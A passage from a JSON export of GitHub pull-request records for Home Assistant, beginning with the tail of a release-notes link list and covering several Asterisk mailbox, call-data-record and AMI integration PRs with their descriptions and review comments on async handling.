https://github.com/home-assistant/home-assistant/pull/16445\r\n[#16464]: https://github.com/home-assistant/home-assistant/pull/16464\r\n[#16468]: https://github.com/home-assistant/home-assistant/pull/16468\r\n[#16479]: https://github.com/home-assistant/home-assistant/pull/16479\r\n[#16485]: https://github.com/home-assistant/home-assistant/pull/16485\r\n[#16487]: https://github.com/home-assistant/home-assistant/pull/16487\r\n[#16489]: https://github.com/home-assistant/home-assistant/pull/16489\r\n[#16498]: https://github.com/home-assistant/home-assistant/pull/16498\r\n[#16503]: https://github.com/home-assistant/home-assistant/pull/16503\r\n[#16512]: https://github.com/home-assistant/home-assistant/pull/16512\r\n[#16520]: https://github.com/home-assistant/home-assistant/pull/16520\r\n[#16522]: https://github.com/home-assistant/home-assistant/pull/16522\r\n[#16527]: https://github.com/home-assistant/home-assistant/pull/16527\r\n[#16540]: https://github.com/home-assistant/home-assistant/pull/16540\r\n[#16547]: https://github.com/home-assistant/home-assistant/pull/16547\r\n[#16551]: https://github.com/home-assistant/home-assistant/pull/16551\r\n[#16553]: https://github.com/home-assistant/home-assistant/pull/16553\r\n[#16555]: https://github.com/home-assistant/home-assistant/pull/16555\r\n[#16563]: https://github.com/home-assistant/home-assistant/pull/16563\r\n[#16565]: https://github.com/home-assistant/home-assistant/pull/16565\r\n[#16569]: https://github.com/home-assistant/home-assistant/pull/16569\r\n[#16570]: https://github.com/home-assistant/home-assistant/pull/16570\r\n[#16571]: https://github.com/home-assistant/home-assistant/pull/16571\r\n[#16579]: https://github.com/home-assistant/home-assistant/pull/16579\r\n[#16580]: https://github.com/home-assistant/home-assistant/pull/16580\r\n[#16582]: https://github.com/home-assistant/home-assistant/pull/16582\r\n[#16588]: https://github.com/home-assistant/home-assistant/pull/16588\r\n[#16590]: https://github.com/home-assistant/home-assistant/pull/16590\r\n[#16591]: https://github.com/home-assistant/home-assistant/pull/16591\r\n[#16594]: https://github.com/home-assistant/home-assistant/pull/16594\r\n[#16597]: https://github.com/home-assistant/home-assistant/pull/16597\r\n[#16598]: https://github.com/home-assistant/home-assistant/pull/16598\r\n[#16599]: https://github.com/home-assistant/home-assistant/pull/16599\r\n[#16601]: https://github.com/home-assistant/home-assistant/pull/16601\r\n[#16602]: https://github.com/home-assistant/home-assistant/pull/16602\r\n[#16603]: https://github.com/home-assistant/home-assistant/pull/16603\r\n[#16605]: https://github.com/home-assistant/home-assistant/pull/16605\r\n[#16609]: https://github.com/home-assistant/home-assistant/pull/16609\r\n[#16610]: https://github.com/home-assistant/home-assistant/pull/16610\r\n[#16617]: https://github.com/home-assistant/home-assistant/pull/16617\r\n[#16618]: https://github.com/home-assistant/home-assistant/pull/16618\r\n[#16619]: https://github.com/home-assistant/home-assistant/pull/16619\r\n[#16621]: https://github.com/home-assistant/home-assistant/pull/16621\r\n[#16622]: https://github.com/home-assistant/home-assistant/pull/16622\r\n[#16624]: https://github.com/home-assistant/home-assistant/pull/16624\r\n[#16625]: https://github.com/home-assistant/home-assistant/pull/16625\r\n[#16626]: https://github.com/home-assistant/home-assistant/pull/16626\r\n[#16627]: https://github.com/home-assistant/home-assistant/pull/16627\r\n[#16628]: https://github.com/home-assistant/home-assistant/pull/16628\r\n[#16633]: https://github.com/home-assistant/home-assistant/pull/16633\r\n[#16636]: https://github.com/home-assistant/home-assistant/pull/16636\r\n[#16637]: https://github.com/home-assistant/home-assistant/pull/16637\r\n[#16645]: https://github.com/home-assistant/home-assistant/pull/16645\r\n[#16646]: https://github.com/home-assistant/home-assistant/pull/16646\r\n[#16649]: https://github.com/home-assistant/home-assistant/pull/16649\r\n[#16650]: https://github.com/home-assistant/home-assistant/pull/16650\r\n[#16651]: https://github.com/home-assistant/home-assistant/pull/16651\r\n[#16652]: https://github.com/home-assistant/home-assistant/pull/16652\r\n[#16654]: https://github.com/home-assistant/home-assistant/pull/16654\r\n[#16655]: https://github.com/home-assistant/home-assistant/pull/16655\r\n[#16656]: https://github.com/home-assistant/home-assistant/pull/16656\r\n[#16659]: https://github.com/home-assistant/home-assistant/pull/16659\r\n[#16664]: https://github.com/home-assistant/home-assistant/pull/16664\r\n[#16665]: https://github.com/home-assistant/home-assistant/pull/16665\r\n[#16669]: https://github.com/home-assistant/home-assistant/pull/16669\r\n[#16673]: https://github.com/home-assistant/home-assistant/pull/16673\r\n[#16674]: https://github.com/home-assistant/home-assistant/pull/16674\r\n[#16681]: https://github.com/home-assistant/home-assistant/pull/16681\r\n[#16683]: https://github.com/home-assistant/home-assistant/pull/16683\r\n[#16688]: https://github.com/home-assistant/home-assistant/pull/16688\r\n[#16699]: https://github.com/home-assistant/home-assistant/pull/16699\r\n[#16709]: https://github.com/home-assistant/home-assistant/pull/16709\r\n[#16710]: https://github.com/home-assistant/home-assistant/pull/16710\r\n[#16713]: https://github.com/home-assistant/home-assistant/pull/16713\r\n[#16718]: https://github.com/home-assistant/home-assistant/pull/16718\r\n[#16721]: https://github.com/home-assistant/home-assistant/pull/16721\r\n[#16723]: https://github.com/home-assistant/home-assistant/pull/16723\r\n[#16727]: https://github.com/home-assistant/home-assistant/pull/16727\r\n[#16729]: https://github.com/home-assistant/home-assistant/pull/16729\r\n[#16731]: https://github.com/home-assistant/home-assistant/pull/16731\r\n[#16734]: https://github.com/home-assistant/home-assistant/pull/16734\r\n[#16736]: https://github.com/home-assistant/home-assistant/pull/16736\r\n[#16737]: https://github.com/home-assistant/home-assistant/pull/16737\r\n[#16743]: https://github.com/home-assistant/home-assistant/pull/16743\r\n[#16744]: https://github.com/home-assistant/home-assistant/pull/16744\r\n[#16752]: https://github.com/home-assistant/home-assistant/pull/16752\r\n[#16753]: https://github.com/home-assistant/home-assistant/pull/16753\r\n[#16757]: https://github.com/home-assistant/home-assistant/pull/16757\r\n[#16758]: https://github.com/home-assistant/home-assistant/pull/16758\r\n[#16759]: https://github.com/home-assistant/home-assistant/pull/16759\r\n[#16760]: https://github.com/home-assistant/home-assistant/pull/16760\r\n[#16761]: https://github.com/home-assistant/home-assistant/pull/16761\r\n[#16768]: https://github.com/home-assistant/home-assistant/pull/16768\r\n[#16769]: https://github.com/home-assistant/home-assistant/pull/16769\r\n[#16776]: https://github.com/home-assistant/home-assistant/pull/16776\r\n[#16778]: https://github.com/home-assistant/home-assistant/pull/16778\r\n[#16779]: https://github.com/home-assistant/home-assistant/pull/16779\r\n[#16780]: https://github.com/home-assistant/home-assistant/pull/16780\r\n[#16789]: https://github.com/home-assistant/home-assistant/pull/16789\r\n[#16795]: https://github.com/home-assistant/home-assistant/pull/16795\r\n[#16799]: https://github.com/home-assistant/home-assistant/pull/16799\r\n[#16800]: https://github.com/home-assistant/home-assistant/pull/16800\r\n[#16803]: https://github.com/home-assistant/home-assistant/pull/16803\r\n[#16804]: https://github.com/home-assistant/home-assistant/pull/16804\r\n[#16805]: https://github.com/home-assistant/home-assistant/pull/16805\r\n[#16806]: https://github.com/home-assistant/home-assistant/pull/16806\r\n[#16809]: https://github.com/home-assistant/home-assistant/pull/16809\r\n[#16812]: https://github.com/home-assistant/home-assistant/pull/16812\r\n[#16831]: https://github.com/home-assistant/home-assistant/pull/16831\r\n[#16835]: https://github.com/home-assistant/home-assistant/pull/16835\r\n[#16841]: https://github.com/home-assistant/home-assistant/pull/16841\r\n[#16842]: https://github.com/home-assistant/home-assistant/pull/16842\r\n[#16846]: https://github.com/home-assistant/home-assistant/pull/16846\r\n[#16862]: https://github.com/home-assistant/home-assistant/pull/16862\r\n[#16864]: https://github.com/home-assistant/home-assistant/pull/16864\r\n[#16866]: https://github.com/home-assistant/home-assistant/pull/16866\r\n[#16869]: https://github.com/home-assistant/home-assistant/pull/16869\r\n[#16891]: https://github.com/home-assistant/home-assistant/pull/16891\r\n[#16927]: https://github.com/home-assistant/home-assistant/pull/16927\r\n[@Adminiuga]: https://github.com/Adminiuga\r\n[@Cereal2nd]: https://github.com/Cereal2nd\r\n[@Danielhiversen]: https://github.com/Danielhiversen\r\n[@Dullage]: https://github.com/Dullage\r\n[@Harvtronix]: https://github.com/Harvtronix\r\n[@Kane610]: https://github.com/Kane610\r\n[@OverloadUT]: https://github.com/OverloadUT\r\n[@PhracturedBlue]: https://github.com/PhracturedBlue\r\n[@abmantis]: https://github.com/abmantis\r\n[@amelchio]: https://github.com/amelchio\r\n[@awarecan]: https://github.com/awarecan\r\n[@bachya]: https://github.com/bachya\r\n[@balloob]: https://github.com/balloob\r\n[@bieniu]: https://github.com/bieniu\r\n[@cdce8p]: https://github.com/cdce8p\r\n[@cgarwood]: https://github.com/cgarwood\r\n[@cgtobi]: https://github.com/cgtobi\r\n[@christopheBfr]: https://github.com/christopheBfr\r\n[@damarco]: https://github.com/damarco\r\n[@danielperna84]: https://github.com/danielperna84\r\n[@dshokouhi]: https://github.com/dshokouhi\r\n[@emontnemery]: https://github.com/emontnemery\r\n[@evanjd]: https://github.com/evanjd\r\n[@exxamalte]: https://github.com/exxamalte\r\n[@fabaff]: https://github.com/fabaff\r\n[@geekofweek]: https://github.com/geekofweek\r\n[@gerard33]: https://github.com/gerard33\r\n[@glpatcern]: https://github.com/glpatcern\r\n[@gwww]: https://github.com/gwww\r\n[@heythisisnate]: https://github.com/heythisisnate\r\n[@hobbypunk90]: https://github.com/hobbypunk90\r\n[@huangyupeng]: https://github.com/huangyupeng\r\n[@isonet]: https://github.com/isonet\r\n[@jeradM]: https://github.com/jeradM\r\n[@kunago]: https://github.com/kunago\r\n[@mbrrg]: https://github.com/mbrrg\r\n[@mrosseel]: https://github.com/mrosseel\r\n[@mvn23]: https://github.com/mvn23\r\n[@mxworm]: https://github.com/mxworm\r\n[@nikolaykasyanov]: https://github.com/nikolaykasyanov\r\n[@pvizeli]: https://github.com/pvizeli\r\n[@reefab]: https://github.com/reefab\r\n[@robin13]: https://github.com/robin13\r\n[@rohankapoorcom]: https://github.com/rohankapoorcom\r\n[@scop]: https://github.com/scop\r\n[@sergeymaysak]: https://github.com/sergeymaysak\r\n[@smurfix]: https://github.com/smurfix\r\n[@soldag]: https://github.com/soldag\r\n[@tadly]: https://github.com/tadly\r\n[@thomasloven]: https://github.com/thomasloven\r\n[@tiste]: https://github.com/tiste\r\n[@tsvi]: https://github.com/tsvi\r\n[@vikramgorla]: https://github.com/vikramgorla\r\n[@w1ll1am23]: https://github.com/w1ll1am23\r\n[@zoe1337]: https://github.com/zoe1337\r\n[alarm_control_panel.spc docs]: https://www.home-assistant.io/components/alarm_control_panel.spc/\r\n[alexa docs]: https://www.home-assistant.io/components/alexa/\r\n[apple_tv docs]: https://www.home-assistant.io/components/apple_tv/\r\n[asterisk_mbox docs]: https://www.home-assistant.io/components/asterisk_mbox/\r\n[binary_sensor.deconz docs]: https://www.home-assistant.io/components/binary_sensor.deconz/\r\n[binary_sensor.homematicip_cloud docs]: https://www.home-assistant.io/components/binary_sensor.homematicip_cloud/\r\n[binary_sensor.nest docs]: https://www.home-assistant.io/components/binary_sensor.nest/\r\n[binary_sensor.rest docs]: https://www.home-assistant.io/components/binary_sensor.rest/\r\n[binary_sensor.spc docs]: https://www.home-assistant.io/components/binary_sensor.spc/\r\n[binary_sensor.wirelesstag docs]: https://www.home-assistant.io/components/binary_sensor.wirelesstag/\r\n[binary_sensor.workday docs]: https://www.home-assistant.io/components/binary_sensor.workday/\r\n[binary_sensor.zha docs]: https://www.home-assistant.io/components/binary_sensor.zha/\r\n[bmw_connected_drive docs]: https://www.home-assistant.io/components/bmw_connected_drive/\r\n[camera.axis docs]: https://www.home-assistant.io/components/camera.axis/\r\n[camera.logi_circle docs]: https://www.home-assistant.io/components/camera.logi_circle/\r\n[camera.mjpeg docs]: https://www.home-assistant.io/components/camera.mjpeg/\r\n[camera.mqtt docs]: https://www.home-assistant.io/components/camera.mqtt/\r\n[camera.nest docs]: https://www.home-assistant.io/components/camera.nest/\r\n[camera.ring docs]: https://www.home-assistant.io/components/camera.ring/\r\n[camera.zoneminder docs]: https://www.home-assistant.io/components/camera.zoneminder/\r\n[climate.econet docs]: https://www.home-assistant.io/components/climate.econet/\r\n[climate.opentherm_gw docs]: https://www.home-assistant.io/components/climate.opentherm_gw/\r\n[climate.wink docs]: https://www.home-assistant.io/components/climate.wink/\r\n[cloud docs]: https://www.home-assistant.io/components/cloud/\r\n[config docs]: https://www.home-assistant.io/components/config/\r\n[cover docs]: https://www.home-assistant.io/components/cover/\r\n[cover.deconz docs]: https://www.home-assistant.io/components/cover.deconz/\r\n[cover.isy994 docs]: https://www.home-assistant.io/components/cover.isy994/\r\n[cover.myq docs]: https://www.home-assistant.io/components/cover.myq/\r\n[cover.tuya docs]: https://www.home-assistant.io/components/cover.tuya/\r\n[deconz docs]: https://www.home-assistant.io/components/deconz/\r\n[device_tracker docs]: https://www.home-assistant.io/components/device_tracker/\r\n[ecovacs docs]: https://www.home-assistant.io/components/ecovacs/\r\n[edp_redy docs]: https://www.home-assistant.io/components/edp_redy/\r\n[fan.zha docs]: https://www.home-assistant.io/components/fan.zha/\r\n[geo_location docs]: https://www.home-assistant.io/components/geo_location/\r\n[google_assistant docs]: https://www.home-assistant.io/components/google_assistant/\r\n[hangouts docs]: https://www.home-assistant.io/components/hangouts/\r\n[hassio docs]: https://www.home-assistant.io/components/hassio/\r\n[homekit docs]: https://www.home-assistant.io/components/homekit/\r\n[homematic docs]: https://www.home-assistant.io/components/homematic/\r\n[homematicip_cloud docs]: https://www.home-assistant.io/components/homematicip_cloud/\r\n[http docs]: https://www.home-assistant.io/components/http/\r\n[huawei_lte docs]: https://www.home-assistant.io/components/huawei_lte/\r\n[ios docs]: https://www.home-assistant.io/components/ios/\r\n[konnected docs]: https://www.home-assistant.io/components/konnected/\r\n[light.deconz docs]: https://www.home-assistant.io/components/light.deconz/\r\n[light.isy994 docs]: https://www.home-assistant.io/components/light.isy994/\r\n[light.rpi_gpio_pwm docs]: https://www.home-assistant.io/components/light.rpi_gpio_pwm/\r\n[light.yeelight docs]: https://www.home-assistant.io/components/light.yeelight/\r\n[light.zha docs]: https://www.home-assistant.io/components/light.zha/\r\n[light.zwave docs]: https://www.home-assistant.io/components/light.zwave/\r\n[logi_circle docs]: https://www.home-assistant.io/components/logi_circle/\r\n[mailbox docs]: https://www.home-assistant.io/components/mailbox/\r\n[mailbox.asterisk_cdr docs]: https://www.home-assistant.io/components/mailbox.asterisk_cdr/\r\n[mailbox.asterisk_mbox docs]: https://www.home-assistant.io/components/mailbox.asterisk_mbox/\r\n[media_extractor docs]: https://www.home-assistant.io/components/media_extractor/\r\n[media_player.cast docs]: https://www.home-assistant.io/components/media_player.cast/\r\n[media_player.panasonic_viera docs]: https://www.home-assistant.io/components/media_player.panasonic_viera/\r\n[media_player.samsungtv docs]: https://www.home-assistant.io/components/media_player.samsungtv/\r\n[media_player.sonos docs]: https://www.home-assistant.io/components/media_player.sonos/\r\n[media_player.soundtouch docs]: https://www.home-assistant.io/components/media_player.soundtouch/\r\n[media_player.webostv docs]: https://www.home-assistant.io/components/media_player.webostv/\r\n[mqtt docs]: https://www.home-assistant.io/components/mqtt/\r\n[neato docs]: https://www.home-assistant.io/components/neato/\r\n[netgear_lte docs]: https://www.home-assistant.io/components/netgear_lte/\r\n[notify docs]: https://www.home-assistant.io/components/notify/\r\n[openuv docs]: https://www.home-assistant.io/components/openuv/\r\n[persistent_notification docs]: https://www.home-assistant.io/components/persistent_notification/\r\n[python_script docs]: https://www.home-assistant.io/components/python_script/\r\n[rachio docs]: https://www.home-assistant.io/components/rachio/\r\n[sensor.airvisual docs]: https://www.home-assistant.io/components/sensor.airvisual/\r\n[sensor.deconz docs]: https://www.home-assistant.io/components/sensor.deconz/\r\n[sensor.dyson docs]: https://www.home-assistant.io/components/sensor.dyson/\r\n[sensor.edp_redy docs]: https://www.home-assistant.io/components/sensor.edp_redy/\r\n[sensor.homematicip_cloud docs]: https://www.home-assistant.io/components/sensor.homematicip_cloud/\r\n[sensor.huawei_lte docs]: https://www.home-assistant.io/components/sensor.huawei_lte/\r\n[sensor.ios docs]: https://www.home-assistant.io/components/sensor.ios/\r\n[sensor.jewish_calendar docs]: https://www.home-assistant.io/components/sensor.jewish_calendar/\r\n[sensor.linky docs]: https://www.home-assistant.io/components/sensor.linky/\r\n[sensor.logi_circle docs]: https://www.home-assistant.io/components/sensor.logi_circle/\r\n[sensor.nest docs]: https://www.home-assistant.io/components/sensor.nest/\r\n[sensor.netdata docs]: https://www.home-assistant.io/components/sensor.netdata/\r\n[sensor.netgear_lte docs]: https://www.home-assistant.io/components/sensor.netgear_lte/\r\n[sensor.qnap docs]: https://www.home-assistant.io/components/sensor.qnap/\r\n[sensor.rest docs]: https://www.home-assistant.io/components/sensor.rest/\r\n[sensor.rmvtransport docs]: https://www.home-assistant.io/components/sensor.rmvtransport/\r\n[sensor.scrape docs]: https://www.home-assistant.io/components/sensor.scrape/\r\n[sensor.shodan docs]: https://www.home-assistant.io/components/sensor.shodan/\r\n[sensor.starlingbank docs]: https://www.home-assistant.io/components/sensor.starlingbank/\r\n[sensor.swiss_public_transport docs]: https://www.home-assistant.io/components/sensor.swiss_public_transport/\r\n[sensor.tahoma docs]: https://www.home-assistant.io/components/sensor.tahoma/\r\n[sensor.tibber docs]: https://www.home-assistant.io/components/sensor.tibber/\r\n[sensor.twitch docs]: https://www.home-assistant.io/components/sensor.twitch/\r\n[sensor.velbus docs]: https://www.home-assistant.io/components/sensor.velbus/\r\n[sensor.wirelesstag docs]: https://www.home-assistant.io/components/sensor.wirelesstag/\r\n[sensor.yr docs]: https://www.home-assistant.io/components/sensor.yr/\r\n[sensor.zha docs]: https://www.home-assistant.io/components/sensor.zha/\r\n[shiftr docs]: https://www.home-assistant.io/components/shiftr/\r\n[sonos docs]: https://www.home-assistant.io/components/sonos/\r\n[spc docs]: https://www.home-assistant.io/components/spc/\r\n[switch.broadlink docs]: https://www.home-assistant.io/components/switch.broadlink/\r\n[switch.deconz docs]: https://www.home-assistant.io/components/switch.deconz/\r\n[switch.edp_redy docs]: https://www.home-assistant.io/components/switch.edp_redy/\r\n[switch.konnected docs]: https://www.home-assistant.io/components/switch.konnected/\r\n[switch.mqtt docs]: https://www.home-assistant.io/components/switch.mqtt/\r\n[switch.switchmate docs]: https://www.home-assistant.io/components/switch.switchmate/\r\n[switch.wake_on_lan docs]: https://www.home-assistant.io/components/switch.wake_on_lan/\r\n[switch.wirelesstag docs]: https://www.home-assistant.io/components/switch.wirelesstag/\r\n[switch.zha docs]: https://www.home-assistant.io/components/switch.zha/\r\n[tahoma docs]: https://www.home-assistant.io/components/tahoma/\r\n[tradfri docs]: https://www.home-assistant.io/components/tradfri/\r\n[updater docs]: https://www.home-assistant.io/components/updater/\r\n[vacuum.ecovacs docs]: https://www.home-assistant.io/components/vacuum.ecovacs/\r\n[vacuum.neato docs]: https://www.home-assistant.io/components/vacuum.neato/\r\n[velbus docs]: https://www.home-assistant.io/components/velbus/\r\n[wake_on_lan docs]: https://www.home-assistant.io/components/wake_on_lan/\r\n[websocket_api docs]: https://www.home-assistant.io/components/websocket_api/\r\n[wink docs]: https://www.home-assistant.io/components/wink/\r\n[wirelesstag docs]: https://www.home-assistant.io/components/wirelesstag/\r\n[xiaomi_aqara docs]: https://www.home-assistant.io/components/xiaomi_aqara/\r\n[zha docs]: https://www.home-assistant.io/components/zha/\r\n[zoneminder docs]: https://www.home-assistant.io/components/zoneminder/",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/16940",
                    "merged_at": "2018-09-28T14:51:25Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/16579",
                "title": "Add Call Data Log platform.  Mailboxes no longer require media",
                "labels": [
                    "new-platform",
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "integration: mailbox",
                    "integration: asterisk_cdr"
                ],
                "user": "PhracturedBlue",
                "issue_author_association": "CONTRIBUTOR",
                "number": 16579,
                "id": 359469068,
                "state": "closed",
                "project_created_at": "2018-09-12T13:00:06Z",
                "closed_at": "2018-09-21T09:55:12Z",
                "body": "## Description:\r\nThis patch adds the asterisk_cdr mailbox platform to view call activity.  It also makes it possible to dynamically create mailbox platforms (needed in case CDR isn't supplied by the server).  Additionally, mailboxes without media are now supported, as are read-only messages, making the mailbox platform more generic.  Lastly all asycio.coroutines have been migrated to async/await.\r\nThis pull request requires a matching frontend change\r\n\r\n**Pull request in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io) with documentation (if applicable): https://github.com/home-assistant/home-assistant.io/pull/6264**\r\n**Pull request in [home-assistant-polymer](https://github.com/home-assistant/home-assistant-polymer) for frontend updates: https://github.com/home-assistant/home-assistant-polymer/pull/1660**\r\n\r\n## Checklist:\r\n  - [x] The code change is tested and works locally.\r\n  - [x] Local tests pass with `tox`. **Your PR cannot be merged unless tests pass**\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n  - [x] Documentation added/updated in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io)\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [x] New files were added to `.coveragerc`.\r\n\r\n",
                "comments": [
                    {
                        "body": "Thanks, should be better now",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2018-09-17T12:16:52Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-421990893"
                    },
                    {
                        "body": "@MartinHjelmare Thanks for the review.  Moving those async calls to sync uncovered a real race condition.  Is there any way to detect async calls made from the wrong thread to help prevent these types of errors?\r\n\r\nI believe I have resolved all of your concerns.\r\n",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2018-09-17T21:42:53Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-422181722"
                    },
                    {
                        "body": "Not sure how to debug that.\r\n\r\nMaybe by timing callbacks?\r\n\r\nhttps://pymotw.com/3/asyncio/debugging.html",
                        "user": "MartinHjelmare",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-09-17T22:33:19Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-422193635"
                    },
                    {
                        "body": "> Not sure how to debug that.\r\n> \r\n> Maybe by timing callbacks?\r\n> \r\n> https://pymotw.com/3/asyncio/debugging.html\r\n\r\nSorry, I wasn't clear.  I meant that changing to using the sync versions uncovered a timing race which I have already fixed.  I was just wondering in general about checkers to help find these types of issues before I submit patches",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2018-09-18T00:53:03Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-422217548"
                    },
                    {
                        "body": "Yes, that was what I was answering.",
                        "user": "MartinHjelmare",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2018-09-18T02:39:34Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-422234672"
                    },
                    {
                        "body": "Thanks, hopefully I've addressed your concerns now.  Please let me know if you see anything else",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2018-09-18T13:55:23Z",
                        "url": "https://github.com/home-assistant/core/pull/16579#issuecomment-422402724"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/16579",
                    "merged_at": "2018-09-21T09:55:12Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/16425",
                "title": "[WIP] Add Asterisk component",
                "labels": [
                    "new-platform",
                    "cla-signed",
                    "docs-missing",
                    "integration: asterisk_ami"
                ],
                "user": "girlpunk",
                "issue_author_association": "CONTRIBUTOR",
                "number": 16425,
                "id": 356995047,
                "state": "closed",
                "project_created_at": "2018-09-04T22:13:21Z",
                "closed_at": "2019-02-06T01:06:30Z",
                "body": "## Description:\r\nNew component for intigrations with Asterisk-based phone systems using the Asterisk Management Interface (AMI). Very much a WIP, but I would appreciate a quick review to make sure what's done so far looks ok.\r\n\r\n**Pull request in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io) with documentation (if applicable):** TBC\r\n\r\n## Example entry for `configuration.yaml` (if applicable):\r\n```yaml\r\nasterisk_ami:\r\n  host: localhost\r\n  username: admin\r\n  password: correcthorsebatterystaple\r\n  mailboxes:\r\n  - 100@default\r\n```\r\n\r\n## Checklist:\r\n  - [X] The code change is tested and works locally.\r\n  - [ ] Local tests pass with `tox`. **Your PR cannot be merged unless tests pass**\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n  - [ ] Documentation added/updated in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io)\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [X] New dependencies have been added to the `REQUIREMENTS` variable ([example][ex-requir]).\r\n  - [X] New dependencies are only imported inside functions that use them ([example][ex-import]).\r\n  - [ ] New or updated dependencies have been added to `requirements_all.txt` by running `script/gen_requirements_all.py`.\r\n  - [ ] New files were added to `.coveragerc`.\r\n\r\nIf the code does not interact with devices:\r\n  - [ ] Tests have been added to verify that the new code works.\r\n\r\n[ex-requir]: https://github.com/home-assistant/home-assistant/blob/dev/homeassistant/components/keyboard.py#L14\r\n[ex-import]: https://github.com/home-assistant/home-assistant/blob/dev/homeassistant/components/keyboard.py#L54\r\n",
                "comments": [
                    {
                        "body": "This PR seems to have gone stale. Closing it.",
                        "user": "balloob",
                        "issue_author_association": "MEMBER",
                        "project_created_at": "2019-02-06T01:06:30Z",
                        "url": "https://github.com/home-assistant/core/pull/16425#issuecomment-460866231"
                    }
                ],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/16425",
                    "merged_at": null
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/16296",
                "title": "Use asterisk_mbox 0.5.0 client",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox",
                    "small-pr"
                ],
                "user": "PhracturedBlue",
                "issue_author_association": "CONTRIBUTOR",
                "number": 16296,
                "id": 355591208,
                "state": "closed",
                "project_created_at": "2018-08-30T13:41:48Z",
                "closed_at": "2018-08-30T16:44:38Z",
                "body": "## Description:\r\nThe 0.5 server has many bug fixes, but is incompatible with the 0.4.0 client despite the end-facing API being the same.  We need to move to the 0.5.0 client in order to be able to communicate with the 0.5 server.\r\n## Checklist:\r\n  - [x] The code change is tested and works locally.\r\n  - [x] Local tests pass with `tox`. **Your PR cannot be merged unless tests pass**\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/16296",
                    "merged_at": "2018-08-30T16:44:38Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/11774",
                "title": "Update header and make it less verbose",
                "labels": [
                    "cla-signed",
                    "integration: asterisk_mbox"
                ],
                "user": "fabaff",
                "issue_author_association": "MEMBER",
                "number": 11774,
                "id": 289783902,
                "state": "closed",
                "project_created_at": "2018-01-18T21:36:12Z",
                "closed_at": "2018-01-18T22:04:19Z",
                "body": "## Description:\r\n- Update header\r\n- Make it less verbose\r\n- Update ordering\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [x] Local tests with `tox` run successfully. **Your PR cannot be merged unless tests pass**\r\n\r\n",
                "comments": [],
                "pull_request": {
                    "url": "https://api.github.com/repos/home-assistant/core/pulls/11774",
                    "merged_at": "2018-01-18T22:04:19Z"
                }
            },
            {
                "url": "https://github.com/home-assistant/core/pull/11043",
                "title": "Add Asterisk Call Data Record to mailboxes component",
                "labels": [
                    "component",
                    "platform",
                    "requirement",
                    "new-platform",
                    "cla-signed",
                    "integration: demo",
                    "integration: asterisk_mbox",
                    "integration: mailbox",
                    "integration: asterisk_cdr"
                ],
                "user": "PhracturedBlue",
                "issue_author_association": "CONTRIBUTOR",
                "number": 11043,
                "id": 280678946,
                "state": "closed",
                "project_created_at": "2017-12-09T04:40:47Z",
                "closed_at": "2018-04-17T11:00:34Z",
                "body": "## Description:\r\nThis adds the ability to see the call-history from Asterisk as a mailbox component.  There is an associated frontend change as well to allow viewing each mailbox component on its own tab.\r\n\r\nThe frontend pull request is here: https://github.com/home-assistant/home-assistant-polymer/pull/719\r\n\r\n**Pull request in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io) with documentation (if applicable):** home-assistant/home-assistant.github.io#4173\r\n\r\n## Checklist:\r\n\r\nIf user exposed functionality or configuration variables are added/changed:\r\n  - [x] Documentation added/updated in [home-assistant.github.io](https://github.com/home-assistant/home-assistant.github.io)\r\n\r\nIf the code communicates with devices, web services, or third-party tools:\r\n  - [x] Local tests with `tox` run successfully. **Your PR cannot be merged unless tests pass**\r\n  - [x] New dependencies have been added to the `REQUIREMENTS` variable ([example][ex-requir]).\r\n  - [x] New dependencies are only imported inside functions that use them ([example][ex-import]).\r\n  - [x] New dependencies have been added to `requirements_all.txt` by running `script/gen_requirements_all.py`.\r\n  - [x] New files were added to `.coveragerc`.\r\n\r\n",
                "comments": [
                    {
                        "body": "I still struggle with the sync/async usage.\r\nHere is what I'm trying to do:\r\n\r\n`AsteriskData.handle_data()` is called by an independent thread from the `asterisk_mbox` module.  It should send signals to handle data (I believe these should be sent with `dispatcher_send` since they come from outside the event-loop).\r\n\r\nThe signals should be picked up from inside the event-loop and processed there.  My understanding is that these signal handlers (`_request_messages`, `_request_cdr` and `_discover_platform`) are executed asynchronously, and so should use async_* functions internally.\r\n\r\nI am not sure when the `@callback` decorator is appropriate or not.  The `handle_data` function is a callback handler, but is only called from an external thread and not within the event-loop.  Should it have the decorator?  The `_request_*` and `_discover_platform` functions are called by the signal handler within the event-loop. Should these have the decorator?",
                        "user": "PhracturedBlue",
                        "issue_author_association": "CONTRIBUTOR",
                        "project_created_at": "2017-12-11T00:07:10Z",
                        "url": "https://github.com/home-assistant/core/pull/11043#issuecomment-350593397"
                    },
                    {
